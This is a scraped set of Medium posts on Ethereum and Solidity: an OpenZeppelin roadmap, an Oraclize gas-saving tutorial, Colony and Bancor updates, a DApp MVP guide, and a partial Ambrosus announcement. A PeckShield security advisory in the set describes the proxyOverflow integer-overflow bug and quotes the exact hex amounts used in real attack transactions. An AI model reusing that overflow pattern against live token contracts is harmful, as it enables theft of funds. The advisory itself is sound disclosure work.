inversion of control, where oracles call contracts (to communicate outside truths) through a common interface method, and can implement their oracle logic as wanted: trusted expert, closed voting, open voting, API wrapper. Instead of contracts requesting data from oracles, oracles inform contracts of data changes.Better code reuse tools: Current Solidity code reuse is based on copy-pasting or downloading existing code from other repositories. Mature ecosystems have good code repository management systems such as NodeJS\u2019 npm or Ruby\u2019s gems. An interesting variation in Ethereum is the possibility of reusing code already deployed to the blockchain. We\u2019re planning to build tools that allow to easily link your contracts to deployed libraries.All these points are already in our GitHub issue tracker. Bear in mind that this is just a proposal based on the work we\u2019re interested in at Zeppelin Solutions. We\u2019re happy to hear your thoughts and ideas on what to work on next. We want OpenZeppelin to be community-driven and community-maintained. Join us!If you look at our repo now, you\u2019ll see some commits already there, but most of the work is ahead, and we want you to be a part of it!RoadmapThe rough project roadmap for the following months is:Sep 2016. Make OpenZeppelin public and start development.Oct 2016. Gather community around it and build first tools for existing smart contract projects.Nov 2016. Develop first proof of concept of a simple fully OpenZeppelin-based real organization. Security audit code and first major OpenZeppelin release.Dec 2016. Deploy said proof of concept organization and maintain it. Further OpenZeppelin development to more components based on community needs.Jan 2017. Develop the OpenZeppelin organization as a smart contract using OpenZeppelin (eat your own dogfood). Model incentives for contributions to the project (e.g.: tokens assigned for each merged commit).Feb 2017. Deploy OpenZeppelin organization to the blockchain. Plan next 6 months.Be part of the communityContinue the discussion on our forumContribute on GitHubFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": 1, "tags": ["Blockchain", "Ethereum", "Solidity", "Open Source", "Security"]}, {"title": "Reducing ETH Gas by making an Asynchronous Tx with Oraclize", "post_link": "https://medium.com/hackernoon/reducing-eth-gas-by-making-an-asynchronous-tx-with-oraclize-32a5d10236c8?source=search_post", "author_name": "billy rennekamp", "author_link": "https://medium.com/@billyrennekamp", "publish_date": "2017-10-30", "last_modified_date": "2019-04-27", "readtime": "8.18", "claps": 403, "voters": 48, "content": "Reducing ETH Gas by making an Asynchronous Tx with Oraclizebilly rennekampFollowOct 30, 2017 \u00b7 9 min readIn a previous article (\ud83e\udd11) I was able to reduce an Ethereum transaction costing 95 Million (MM) gas down to 4.1MM by converting arrays to byte strings. This was a big step in the process of building clovers.network but 4.1MM gas was still unacceptable. I was able to reduce it again to 1.5MM by utilizing an Oracle to offload the bulk of the work and save only the result\u2014basically making an asynchronous call on the Ethereum Virtual Machine (EVM).The transaction in question contains a function that plays a game of Reversi using moves supplied by the user. If the game is valid and hasn\u2019t previously been registered, the user becomes the owner of that board and is able to sell it as a Clover (\u2724). Furthermore, if the board is symmetrical then the user receives a mining reward in ERC20 ClubToken (\ufe0e\u2663\ufe0e) relative to the rarity of the symmetry. While the game is rather simple to program on the EVM the level of complexity is still very expensive. That\u2019s because every step in the process of checking the game is saved along with the result of that game. This is important to prove the method of validation, however there\u2019s another way to prove validation while not having to pay for it: ask an oracle \ud83d\udd2e.An oracle provides a portal to the world outside of the EVM. If you want to know the current price of Ether in USD, Euro or GBP\u2014ask an oracle. If you want to know the weather \ud83c\udf24 in Chicago , who won the Cubs \ud83d\udc3b game or whether your flight \u2708\ufe0f to ORD is delayed\u2014ask an oracle. You can also do things with an oracle that aren\u2019t possible on the EVM like generate random numbers.There\u2019s some debate about whether these features belong on the Ethereum Blockchain, since in theory all transactions should be verifiable and repeatable\u2014how can a URL request at a specific moment in time be repeatable? (For more information about that debate and oracles in general look here, here and here.) Luckily for me I wanted an oracle to call a function already on the EVM. That way the method of validation is still verifiable but I don\u2019t have to spend gas recording all the steps producing the result.He Said She Said\u2026Oraclize is an oracle that provides a great selection of datasources including Wolfram Alpha, IPFS and any publicly accessible URL. They also offer the ability to query various blockchains for basic info like block number and mining difficulty. I needed to run a non-transactional (constant) function on the Ethereum Blockchain using eth_call but Oraclize doesn\u2019t offer it at this point. Instead I\u2019ll use Infura\u2019s publicly available Ethereum node to make a JSON RPC transaction (same way as Metamask does it). Before I get to building the JSON RPC POST request let\u2019s look at the contract so far:function claimGame(bytes28 firstMoves, bytes28 lastMoves) {  if (isReal(firstMoves, lastMoves)) {    saveGame(firstMoves, lastMoves);  }}function isReal(bytes28 p1, bytes28 p2) constant returns(bool) {  // play the game and check for completeness and errors  ...}function saveGame(bytes28 p1, bytes28 p2) {  // finally save the game  ...}Here checkGame() is a function with game moves as parameters\u2014in this case the moves are stored in bytes28 format (for a similar technique storing data in bytes check out the arrays to bytes article I mentioned earlier). The first thing checkGame() does is check if the moves play a real game by using isReal(). This is the expensive part of the contract that I\u2019m trying to avoid. However you\u2019ll notice that it is a constant function, meaning it doesn\u2019t change anything on the blockchain. That\u2019s why it would be possible to call it with an oracle, who wouldn\u2019t need to pay any gas to do so. Afterwards the oracle can send the results back to the contract to be saved cheaply.Adding OraclizeThe first step to utilizing Oraclize is to add their contract to yours. You can download a copy of oraclizeAPI.sol from their github. Add it to the top of your contract and let your contract inherit the functions. In this case I\u2019m calling my contract CheapTrick.pragma solidity ^0.4.13;import \"./oraclizeAPI.sol\";contract CheapTrick is usingOraclize {  ...}The next step is triggering the Oracle with the designated URL datasource. The contract has inherited the function oraclize_query which takes a variety of different parameters depending on your needs. We\u2019ll be using the format that takes the first param as the data source, the second param as the URL endpoint and the third parameter as the POST object to be sent along with the request. Alternatively you could add an integer representing the number of seconds to wait before triggering the request, and an explicit amount of gas to be used in the callback.function claimGame(bytes28 firstMoves, bytes28 lastMoves) {  oraclize_query('URL', 'https://infura.io', '{...}');}The final step is calling the inherited __callback() function to handle the results of the URL datasource query.function __callback(bytes32 queryId, string results) {  if (results == 'true') saveGame(???, ???);}You\u2019ll notice in this callback you\u2019ve lost the reference to which moves were being played. Oraclize provides a query ID to help with that process. In order to keep track of which callback belongs to which query you can keep track of them with a mapping and a struct like this:pragma solidity ^0.4.13;import \"./oraclizeAPI.sol\";contract CheapTrick is usingOraclize {  struct Moves {    bytes28 firstMoves;    bytes28 lastMoves;  }  mapping (bytes32 => Moves) validIds;  // oraclize_query returns the query ID that is used in the mapping  function claimGame(bytes28 firstMoves, bytes28 lastMoves) {    bytes32 q = oraclize_query('URL', 'https://infura.io', '{...}');    validIds[q].firstMoves = firstMoves;    validIds[q].lastMoves = lastMoves;  }  function __callback(bytes32 q, string result) {    if (bytes(result)[65] == 0x31) {      saveGame(validIds[q].firstMoves, validIds[q].lastMoves);    }  }  ...}In this scenario the query IDs are saved in a mapping of a struct using the query ID as a key. When the callback is triggered the moves can be extracted again using that same query ID.String TheoriesYou may have also noticed or been confused by the line if(bytes(result)[65] == 0x31) . This is the real way to perform if (results == \u2018true\u2019) which was used falsely earlier. The oraclize_query() hits a JSON RPC endpoint which should in turn call the previously seen isReal() function. This function returns a boolean but since Ethereum works in increments of bytes32 that bool value is returned as bytes32. Instead of returning the string \u201ctrue\u201d it returns the hexadecimal value of 1.true  = 0x0000000000000000000000000000000000000000000000000000000000000001false = 0x0000000000000000000000000000000000000000000000000000000000000000This is further complicated by the fact that the result in__callback() is actually a string. So it\u2019s not returning bytes32 but rather bytes32 as represented by a string.true  = \"0x0000000000000000000000000000000000000000000000000000000000000001\"false = \"0x0000000000000000000000000000000000000000000000000000000000000000\"In order to detect whether the game is valid or not we need to look at the last value in that string and detect if it is a 1 or a 0. While working with strings in Solidity it\u2019s important to remember that they are stored as byte arrays (bytes[]) of UTF8 characters. According to w3schools.com the UTF8 control characters in our string look like this:string 0 = decimal 48  = hex 0x30string 1 = decimal 49  = hex 0x31string x = decimal 120 = hex 0x78In Solidity our string as represented in bytes[] would look something like this:string = \"0x0000000000000000000000000000000000000000000000000000000000000001\"string[] = [\"0\", \"x\", \"0\", \"0\", ..., \"1\"];bytes[] = [0x30, 0x78, 0x30, 0x30, ..., 0x31];We need to check the last element in the array so we use the same snippet from the contract above: bytes(result)[65] == 0x31 (remember the array has a length of 66 due to the 0x preface) and voila we detect whether the result was true or false.At this point it may be good to point out that Oraclize also offers the ability to upload a snippet of custom code to IPFS with a docker configuration that would allow it to be deployed on an Amazon micro server long enough to be run with the result returned instead of a URL datasource. If this were done the return string could be more efficient than the one we get from the RPC endpoint. However a URL datasource costs the contract owner ~$0.01 per query and the micro server costs ~$0.50 per request. (If you\u2019re still reading this you\u2019ll know by now that I\u2019m always lookin for those deals \ud83e\udd11)JSON RPC POSTFor the last part it\u2019s important to see what was actually inside of that JSON RPC POST object sent to the Infura endpoint which was earlier represented by the nefarious {\u2026} . This means that we need to craft our transaction manually based on the JSON-RPC specs here and crafting the data object following the Ethereum Contract ABI specs here. Our basic eth_call function follows this format:// Requestcurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{coming soon}],\"id\":1}'// Result{  \"id\":1,  \"jsonrpc\": \"2.0\",  \"result\": \"0x\"}The params array consists of an object with the contract address and the data being sent, plus the desired block number:{\"jsonrpc\": \"2.0\", \"method\": \"eth_call\", \"params\": [{to:\"0xFAK3W4LL374DDR355\", data:\"....\"}, \"latest\"]}The data value will be a hexadecimal representation of the desired function name and the parameters being sent along with it. As per the specs, the function name is represented by the first 4 bytes of the hash of the string of the name of the function (including any parameters \ud83d\ude33). In our case using the web3.js utils to help, it would look as follows:var utils = require('web3-utils')let functionName = \"isReal(bytes28,bytes28)\"functionName = utils.sha3(functionName)//0x6b3bd7986bb57b171ccf6056a91eae803767c4600238e08445ece9b98c39ca21functionName = utils.hexToBytes(functionName)// [107, 59, 215, 152, 107, 181, 123, 23, 28, 207, 96, 86, 169, 30, 174, 128, 55, 103, 196, 96, 2, 56, 224, 132, 69, 236, 233, 185, 140, 57, 202, 33]functionName = functionName.slice(0, 4)// [107, 59, 215, 152]functionName = utils.bytesToHex(functionName)// 0x6b3bd798As a result our function name looks like 0x6b3bd798. The next part is making byte representations of the parameters. Since our moves are already in hexadecimal format we just need to adjust them from 28 bytes to 32 bytes by padding them and removing the 0x prefix:var utils = require('web3-utils')let firstMoves = \"0xd9b7774f9af573c5d69d4996a971f147dfac39f7e9f37785891dfee5\"first32Moves = utils.padRight(first32Moves.slice(2), (32 * 2))// d9b7774f9af573c5d69d4996a971f147dfac39f7e9f37785891dfee500000000let lastMoves = \"0xbd9bb7ed12e559bfcaad69b5f04fa1061438927fc681167470000000\"lastMoves = utils.padRight(lastMoves.slice(2), (32 * 2))// bd9bb7ed12e559bfcaad69b5f04fa1061438927fc68116747000000000000000Put them all together and we\u2019ve got our data \ud83c\udf89{\"jsonrpc\": \"2.0\", \"method\": \"eth_call\", \"params\": [{to:\"0xFAK3C0N7R4C7W411374DDR355\", data:\"6b3bd798d9b7774f9af573c5d69d4996a971f147dfac39f7e9f37785891dfee500000000bd9bb7ed12e559bfcaad69b5f04fa1061438927fc68116747000000000000000\"}, \"latest\"]}You can test the results using Oraclize\u2019s great query tester here .This example code doesn\u2019t correspond to a deployed contract so will not actually work. However, if you follow the link you\u2019ll see a working example requesting the current block number. VERY IMPORTANT: Don\u2019t forget to add a space character at the beginning or end of the POST payload. This tells Oraclize that the data is in fact a POST object. I had a lot of trouble with that until someone from the Oraclize team answered my github issue \ud83d\ude4fIn ConclusionIn total we\u2019ve covered:What is an oracleHow to import and use Oraclize\u2019s API contractHow to keep track of the query and the callbackHow to work with strings in SolidityHow to craft a JSON RPC eth_call to the Infura endpoint", "responses": 2, "tags": ["Ethereum", "Solidity", "Oracle", "Ether", "Blockchain"]}, {"title": "Integer Overflow (i.e., proxyOverflow Bug) Found in Multiple ERC20 Smart Contracts (CVE-2018\u201310376)", "post_link": "https://medium.com/@peckshield/integer-overflow-i-e-proxyoverflow-bug-found-in-multiple-erc20-smart-contracts-14fecfba2759?source=search_post", "author_name": "PeckShield", "author_link": "https://medium.com/@peckshield", "publish_date": "2018-04-25", "last_modified_date": "2018-06-14", "readtime": "2.30", "claps": 427, "voters": 47, "content": "Integer Overflow (i.e., proxyOverflow Bug) Found in Multiple ERC20 Smart Contracts (CVE-2018\u201310376)PeckShieldFollowApr 25, 2018 \u00b7 3 min readOn 4/24/2018, 01:17:50 p.m. UTC, PeckShield, a blockchain security startup, detected an unusual MESH token transaction (shown in Figure 1). In this particular transaction, someone transferred a large amount of MESH token \u2014 0x8fff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff (63 f\u2019s) to herself along with a huge amount fee \u2014 0x7000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0001 to the address issuing this transaction.Figure 1: A Suspicious MESH Token Transfer (with huge amount)There\u2019s another case happened to the SMT token at 07:16:19 UTC with the same attack pattern.Figure 2: A Suspicious SMT Token Transfer (with huge amount)As we look into the corresponding smart contract, we find out that the proxyTransfer()function has a classic integer overflow problem.Figure 3: A proxyOverflow-affected Smart ContractAs shown in Figure 3, both _fee and _value are input parameters which could be controlled by the attacher. If _fee + _value happens to be 0 (the overflow case), the sanity checks in line 206 could be passed. It means the attacker could transfer huge amount of tokens to an address (line 214) with zero balance. Also, a huge amount fee would be transferred to the msg.sender in line 217.From our system-wide scanning, we have located quite a few ERC20 tokens affected, includingWith the touted \u201ccode-is-law\u201d principle in Ethereum blockchain, there is no traditional well-known security response mechanism in place to remedy these vulnerable contracts! A proper way to recover from these vulnerabilities and devastating effects requires coordination and support from all eco-system members, especially digital asset exchanges. In the meantime, we cannot over-emphasize the importance of performing a thorough and comprehensive audit of smart contracts before deployment.Fortunately, we are happy to know that effectively at 04/25/2018 15:30 p.m. GMT+8, OKEx has ERC-20 tokens deposit suspended. (Here is the announcement:https://support.okex.com/hc/en-us/articles/360003019292 ). Similarly, Huobi Pro also suspends deposits and withdrawals of all coins ( http://space.bitleek.com/topic/2132/huobi-pro-suspends-deposits-and-withdrawals-of-all-coins). Meanwhile, we want to point out that certain affected tokens are still tradable on some exchanges (e.g., gate.io, HitBTC, YoBit, and CoinExchange). Note that the presence of non-centralized exchanges with offline trading services could pose additional challenges as they might not be able to stop attackers from laundering their tokens.About USPeckShield Inc. is a blockchain security company which aims to elevate the security, privacy, and usability of current blockchain ecosystem by offering top-notch, industry-leading services and products (including smart contract auditing). Please contact us at Telegram, Twitter, or Email.", "responses": 2, "tags": ["Ethereum", "Smart Contracts", "Bugs", "Blockchain Development", "Solidity"]}, {"title": "Colony Q4 Update", "post_link": "https://medium.com/colony/colony-q4-update-287cda939fde?source=search_post", "author_name": "Colony", "author_link": "https://medium.com/@colony", "publish_date": "2017-10-17", "last_modified_date": "2018-05-30", "readtime": "5.86", "claps": 337, "voters": 47, "content": "Colony Q4 UpdateColonyFollowOct 17, 2017 \u00b7 6 min readAt Colony, we use the OKR method for setting quarterly goals and keeping our distributed team of 12 in sync and accountable. Below is our quarterly report on Q3 and a look ahead at Q4 2017.The end of Q3Good riddance, Q3Let\u2019s start with the good.We published our whitepaperN of 1. Full stop.The rest of the quarter? Well, some unexpected things came up.Our main goal for the quarter was to distribute our tokens. We had everything in place. Whitepaper. Wiki. A beautiful new website. Our token sale contract had been audited by the talented guys at DappHub. The works.But then our lawyer called. And then this happened.The Colony Token SaleDoing an \u201cICO\u201d increasingly seems to be the yardstick by which progress (or even, dare I say, success) is measured in\u2026blog.colony.ioThat changed things.We spent the better part of a month regrouping and figuring out our next steps:What do we need to do to do a token sale? (A: launch the network first.)What\u2019s the minimum functionality needed to securely launch the network? (A: reputation system + revenue & reward system.)How do we remove the reliance on centralized tech in the client? (A: it\u2019s very complicated.)We were expecting to do quite a few things in Q3 that were impacted by the not-doing-a-token-sale outcome:Announce and launch Colony Labs to research and work on the blockchain usability problemDeploy the initial Colony Network functionality to testnetStart a second round of beta testingHire a handful of additional teammatesAll of this was either iceboxed (#1 and #4) or delayed (#2 & #3) due to the token sale fallout.Oh well. It may seem like a huge impediment, but it\u2019s really not. We\u2019re in this for the long haul and postponing a token sale by ~1-year is not a big deal when you zoom out.The Colony Whitepaper ReleaseAfter initially sharing it with a curated list of reviewers and then incorporating their feedback, we published our technical whitepaper.The Colony WhitepaperToday, we are happy to (finally!) release the Colony Whitepaper.blog.colony.ioIt had been a long time comin\u2019.Our most flattering comment so far:I\u2019ve had high hopes for Colony since I came across it several months ago, but this White Paper far exceeded my loftiest expectations.The Colony Whitepaper is the culmination of years of hard work and painstaking attention to detail, but it\u2019s certainly not perfect, and it will be updated as needed.If you\u2019ve read it and have any suggestions for improvement or clarification, hit us up over slack, email, or by submitting a Github pull request.We wrote some other stuff, tooAt the beginning of the quarter, we open-sourced a document for creating a fair employee equity plan.On creating a better employee equity planEconomists believe in full employment. Americans think that work builds character. But what if jobs aren\u2019t working\u2026blog.colony.ioThiago published an illuminating technical blog post on Solidity function best practices.How to write clean, elegant Solidity code using function modifiersOne of the most interesting features in Solidity are function modifiers. When added to a function body they extend it\u2026blog.colony.ioAnd our CEO Jack du Rose had a couple bylines on the future of workWhat Blockchain Means for the Future of WorkIn the eighth millennium BC, Sumerians created proto-writing systems for accounting. Arguably, the blockchain\u2026data-informed.comHow Blockchains Will Reinvent the Job Market - CommPRO.bizJack du Rose, Co-founder, Colony.io Office work is a theatrical performance of emails, meetings, and inscrutable tedium\u2026www.commpro.bizWell met, Q4This quarter is going to be all about building and learning \u2014 the Colony Network, the decentralized product, the market.Our three goals are:An MVP of the Colony Network is built50% of the decentralized backend is complete500 completed transactions are completed by beta-II usersThe Colony Network: Developing and Learning about a Smart Contract EcosystemThe whitepaper is a tedious read for a very good reason: It is meant to describe in detail the blueprint for a fully-realized Colony Network.This quarter (and next), we will be the writing Colony Network smart contracts for:Tasking system (mostly complete)Funding + bounties (mostly complete)Reputation + skillsRevenue + rewardsReputation miningNetwork transaction feeAs we work to implement this functionality we are looking to expand our dogfooding efforts and work with outside contributors.If you are skilled with solidity, have read the whitepaper, and want to contribute to the development of the Colony Network, get in touch with Elena to learn more.Beta II: Developing and Learning about the MarketOur first beta was used by 40 teams comprising 175 collaborators, to whom we are eternally indebted for helping us improve our product.We made some major usability improvements as a result and are now a couple weeks away from deploying an updated task lifecycle workflow which\u2019ll make it easier to incentivize, reward, and track the contributions of your Colony.Once that\u2019s deployed, we\u2019ll be launching a second round of beta testing. Our goal is to have beta-II users complete 500 transactions by the end of Q4.The beta helps us learn more about the market and our fit within it. We have a grand vision for the future of work, but we also foresee more iterative steps for startups and enterprises to begin making work more open.As always, if you\u2019re interested in utilizing Colony, have a use case you think it\u2019ll be good for, and are willing to give us brutally honest and tediously verbose feedback on your experience, reach out to Collin for information about Beta II access.A True DApp: Developing and Learning about Decentralized TechnologiesThe Colony beta, as it exists now, is a hybrid app that runs on a private chain and incorporates quite a bit of client-server functionality and other \u201ctrusty\u201d features \u2014 which have been just fine for our testing purposes!Nevertheless, the Colony dApp as it exists now can\u2019t be considered a pure dApp, and it isn\u2019t congruent with what we\u2019d like Colony to eventually become: an open, decentralized, trustless network of work.While we want to aim for a fully decentralized product, the technologies that the dApp would need to be built upon are still immature.Keeping the dApp entirely based on the decentralized protocol stack (Swarm/IPFS, Whisper, Ethereum) would require substantial trade-offs between decentralization and user experience \u2014 and we have very high standards for user experience.For example, events that occur on-chain such as setting a task bounty need to wait ~15 seconds for the transaction to be mined. When was the last time you felt okay with waiting 15 seconds to add an item on your to-do list \u2014 and paying ~$0.05 in the process? That\u2019s pretty poor UX, but these sorts of things are unavoidable in Ethereum dApps today.There are also some more fundamental issues that the Colony dApp needs to wrestle with. Right now the server dApp relies on the MongoDB for many key features. Migrating database functionality to something decentralized is not a trivial task.So what happens next? Do we continue to run with our client-server architecture and gradually migrate toward decentralization piece by piece? Do we just wait around for scaling and UX solutions to appear in the ether? Do we solve those UX problems ourselves? Is there something we can do right now to move in the right direction?We have decided that the best course of action will be to create a new environment for a server-less dApp, and start fresh with decentralization as the primary consideration. This will lead to a product which has limited functionality in the beginning, but which can benefit from new scaling efforts arising in the Ethereum community.While some work will need to be thrown out, we feel that this is the best approach toward how we envision the final product to be. So starting in Q4, we\u2019re going to move forward without the server, and, using the lessons of the Beta, build a new version of the Colony dApp which is even dAppy-er.", "responses": 1, "tags": ["Blockchain", "Future Of Work", "Ethereum", "Solidity", "Startup"]}, {"title": "Bancor Protocol", "post_link": "https://blog.bancor.network/bancor-protocol-6aac5a297dcb?source=search_post", "author_name": "Eyal Hertzog", "author_link": "https://blog.bancor.network/@eyul", "publish_date": "2017-02-13", "last_modified_date": "2018-05-24", "readtime": "1.89", "claps": 102, "voters": 47, "content": "Bancor ProtocolEyal HertzogFollowFeb 13, 2017 \u00b7 2 min readHello World, We\u2019re the team behind the Bancor Protocol (PDF) and we\u2019re building a decentralized, hierarchical monetary system on the blockchain.When we look at the world of exchange between people, we see two main categories of things that we share and trade \u2014 Information and Value. While information (content such as texts, images, video, etc.) is replicable by its nature (when you share it, you and someone else both have it), value is not (when you give it to someone, you no longer have it.)Before the age of the Internet, there were many private information networks, which some of us are even old enough to remember, like BBSs, Prodigy, Compuserve, AoL, to name a few. The rise of the public Internet changed everything and those which survived adopted the new open, global standard for information exchange, which relies on a collection of TCP/IP networks, interlinked through peering agreements.Until blockchain, all currencies, which represent value, lived in closed silos. Blockchain, the technology pioneered by Bitcoin, is the decentralized value exchange network, the Internet of money. It will eventually replace a large part of today\u2019s private banking networks and allow new players (and the old which adapt) to create new types of value and transact in an open, global system not owned by anyone.The Bancor team has been building products on the Internet since the late nineties. Some of our companies were Contact Networks, MetaCafe, Mytopia, Particle Code and AppCoin. We bumped into Bitcoin in 2011 and began exploring possibilities in user-generated currencies. Following the release of Ethereum in 2015, we understood that smart-contracts were a game changer and would allow for currency creation and customization at scale. Programmable modules that manage and hold value (represented as tokens) can perform value-related processes for a negligible cost \u2014 processes currently handled by various organizations (e.g. escrow services, exchanges, law firms, to name a few). However, the implications of autonomous decentralized code which can manage digital money on an open standard for value exchange are far more profound.In the Summer of 2016, we started working on Bancor with the goal of creating a hierarchical monetary system (where one digital token holds other tokens in its reserve) to build a new type of standard for cryptocurrencies that would lay the foundation for a decentralized global exchange. One that is autonomous, has no spread, no counterparty risk and provides continuous liquidity for any asset. One that enables the long-tail of currencies as the Internet did for content.We would like to share with you, the Internet, our draft whitepaper for your review and comments. All feedback is welcome, and much appreciated.The Bancor Teamhttp://bancor.network", "responses": 1, "tags": ["Bitcoin", "Blockchain", "Ethereum", "Smart Contracts", "Solidity"]}, {"title": "From A to Z: Making the MVP of a real DApp on Ethereum and deploying it", "post_link": "https://medium.com/hackernoon/from-a-to-z-making-the-mvp-of-a-real-dapp-on-ethereum-and-deploying-it-50c750ef0c4e?source=search_post", "author_name": "dev_zl", "author_link": "https://medium.com/@dev_zl", "publish_date": "2018-04-05", "last_modified_date": "2019-04-29", "readtime": "5.97", "claps": 240, "voters": 44, "content": "From A to Z: Making the MVP of a real DApp on Ethereum and deploying itdev_zlFollowApr 5, 2018 \u00b7 6 min readA month ago, I finished writing the Ethereum development walkthrough tutorial series, with the last part being a how-to make a DApp. While it concluded that tutorial series well enough and could serve as a solid starting point, I still thought it could be far more interesting to make a tutorial on how to make a full DApp, from start to finish, and share not only the code, but also the experience to get it running on the Ethereum\u2019s main network.You can find that DApp here, its github repos here and here. It\u2019s on all accounts a real DApp deployed on the Ethereum main net, and we\u2019ll try to dissect its development together.Kick offAs a project, making a decentralized application on Ethereum is not really different from making a classic, centralized one, beside the fact that more care should be put into planning and implementing the smart contracts that power the DApp.So the first thing we need to come up with, is, of course the idea.What will we createOn this point, everyone has a different way of coming up with an idea for a project. For me, a project I always found funny, and it always remained in the back of my mind, is The Million Dollar Homepage, a website from 2005, where the owner, Alex Tew, sold every pixel in a 1000 x 1000 pixels canvas on his website for 1$.So my idea was, why not try to reproduce it on Ethereum? It should be fun and small enough to be doable for a tutorial. Our DApp could sell each pixel not for a whole Ether, it wouldn\u2019t be realistic, but let\u2019s say 1/1000th of one.Starting the development processFor a project as small as this one, writing down the milestones that needs to be achieved is enough to get started, anything more elaborated would require more documentation and throughout designing and modeling.The idea in this DApp is to sell pixels in 10 x 10 parcels, since individual pixels are too small to be seen easily. Tracking these parcels can be achieved by non-fungible tokens, commonly known as ERC-721 tokens, since each parcel is unique. We could obviously have a token keeping track of each individual pixel, but because of the performance limitations of the smart contracts, we have to make as much optimizations as possible.Each token owner in our DApp should have the possibility to modify the pixel colors, add a description or a link to their parcel, and could resell their parcel.Doing it the MVP wayIn order to not waste development time making the perfect product, and check our assumptions early on, we will make just the most important functionality first, which is allowing users to acquire pixels parcels, and modify their colors and description.There are people who just set up a text-only landing page to see how many users it attracts, but let\u2019s not be that lazy and actually create a functioning prototype.The smart contract(s)Having your core features in mind (for some it\u2019s just generating a bunch of tokens and selling them) you should design your smart contract(s) in a way that you could enhance or upgrade them in a practical way. There isn\u2019t an industry standard or a best way to achieve that but a bit of research will return a few potential solutions implemented by other projects. You could pick up one and adapt it to your needs, or come up with a solution more suitable to your project.In this project, I preferred to implement all the functionalities directly in the smart contract. Since I already had the base code for an ERC-721 token from another project, I just made some necessary modifications to it, and added the ability for the owner to modify the data of the token, and the possibility to sell their token.I don\u2019t think there will be any needs later that would require updating the smart contract, and if someone, for example, wants to add a functionality like renting their parcel, they could use another smart contract to achieve that.Also, I didn\u2019t put any pause functionality into the smart contract, or a mechanism to change the smart contract if something goes wrong, because my second goal for this project, is to show off what differentiate developing on the blockchain from a classic centralized application for anyone who\u2019s new to the blockchain and discovers it through this project.It\u2019s the wise choice to have a safety plan if shit hits the fans, but I wanted to take that risk with this project by stripping myself from any power over the deployed smart contract.Writing a good test suite is also important, since you can\u2019t risk to follow the write-code-then-wait-for-bugs-during-production methodology with smart contracts. You need to make sure as much as possible that your code does only what it should and nothing more.Web frontWhile I wrote the smart contract completely since it was short enough that I didn\u2019t want to waste more time finding the best way to upgrade it, on the web front-end, it\u2019s definitely possible to go down the MVP road.The functionalities I implemented are: showing the pixels grid, allowing users to acquire the parcels, and allowing them to modify the data for it. One could say that the last functionality crosses the first iteration of making an MVP, but again, let\u2019s not be lazy asses.Of course the other functionalities exists on the smart contract, and could be added anytime to the front-end, but we want to confirm our assumptions first, and make sure that there are people who want to use our product.Deploying the DAppNow, that our MVP is developed and ready, we need to deploy it.The smart contractTo deploy the smart contract, we need ether for gas, to acquire ether, you could buy it on a platform like Coinbase or Cex.io, but it will probably take days or weeks depending on the platform for your order to go through.Cryptocurrencies transaction, circa 2018Another solution is to buy ether from a seller nearby, by finding them on a platform like LocalEthereum or some Facebook group. Yeah, it really looks like buying drugs, and it definitely doesn\u2019t help cryptocurrencies shady image.After you got your ether, the easiest solution to deploy a smart contract is to use Remix and MetaMask, but I preferred to use a light geth node and truffle.The front-endFor the front-end, I used Github websites, it\u2019s free and makes the code source available openly, which is what we want.MarketingWell, as I said on top, a DApp is just like any other software, the same rules apply to it, it\u2019s great to create something, but if no one knows about it or try it, it\u2019s useless.Now, this is a point I can\u2019t help you on, because I\u2019m totally oblivious to taking the word out for a project, I could not sell sunscreen to a sunburned guy. So you would need to rely on some PR magician to attract users to try your DApp.The codeThe source code is available on Github.The smart contracts are here:1000ethhomepage/1000ethhomepage-contracts1000ethhomepage-contracts - The smart contracts of the 1000ethhomepage, an MVP of a DApp on Ethereum.github.comWhile the repo for the web front is here:1000ethhomepage/1000ethhomepage.github.io1000ethhomepage.github.io - The web page of the 1000ethhomepage, an MVP of a DApp on Ethereum.github.comLooking forwardObviously, even the functionalities I implemented on the front end are incomplete and need more polishing, but since we are going the MVP way, it\u2019s not necessary to enhance them now. I can also see some performance problems that could arise if a lot of parcels are acquired, but it\u2019s not the case now, so there is no need for early optimizations, until we see how the DApp performs during production.Apart from this being a tutorial, I really want to have this website as a real, working, demo project for people who are just discovering the blockchain, and Ethereum\u2019s possibilities, if the DApp gets any attention, one of my goals is really to put an accent on introducing decentralization to newcomers, and of course, keeping this project as an ongoing tutorial and field report of how the DApp is surviving on the blockchain.So, don\u2019t hesitate to take a look at the deployed version of the DApp, maybe acquire some parcel and link it to your super, ground-breaking DApp, or advertise your scammy ICO, or just to leave your mark on it, it will be helpful to have anything of value to write in a follow-up tutorial.And of course you can find me on twitter @dev_zl.", "responses": 3, "tags": ["Ethereum", "Dapps", "MVP", "Solidity", "Dapp Mvp Ethereum"]}, {"title": "Ambrosus Alpha: Gateway API and Developer Portal Launched", "post_link": "https://blog.ambrosus.com/ambrosus-alpha-gateway-api-and-developer-portal-launched-689dec5d9fab?source=search_post", "author_name": "Team Ambrosus", "author_link": "https://blog.ambrosus.com/@ambrosus", "publish_date": "2018-02-26", "last_modified_date": "2018-04-29", "readtime": "1.91", "claps": 840, "voters": 42, "content": "Ambrosus Alpha: Gateway API and Developer Portal LaunchedTeam AmbrosusFollowFeb 26, 2018 \u00b7 2 min readWe are excited to announce that following the private testing of tools and gateways of AMB-NET, we are enabling them for the community use in order to start experimenting with and building on top of AMB-NET. Additional elements will be launched throughout Spring 2018 through the two key assets as part of the Public Alpha Release aimed at the technology-savvy members of Ambrosus Community: Developer Portal and Gateway API.Developer Portal (tech.ambrosus.com)Developer Portal serves as the focal point for the developers wishing to build tools and solutions on top of Ambrosus Network (AMB-NET). The first assets present there will include a JavaScript Library and SDKs for iOS and Android, permitting development of apps compatible with most handheld devices. The Portal also introduces the fundamental building blocks of Ambrosus Network: Assets, Events and Accounts. The Portal will be further populated by additional features over the next few weeks. Updates will be communicated via social media and will be pushed on Ambrosus Github.Gateway API (dev.ambrosus.com)Gateway API permits developers to interact with Ambrosus Network via APIs. In the Alpha release users are able to set up Accounts. Each Account can create Assets and Events on AMB-NET. Both Assets and Events can have multiple properties. Gateway API is the first step towards digitalising supply chains using a combination of blockchain and IoT network. Additional instructions and elements will be released on Gateway API page. As the current public Alpha is still in early experimental stages, developers are advised that they are using the Alpha at their own risk.Developers are welcome to reach out to Ambrosus with suggestions, feedback and comments. Ambrosus has a pool of Amber (AMB) 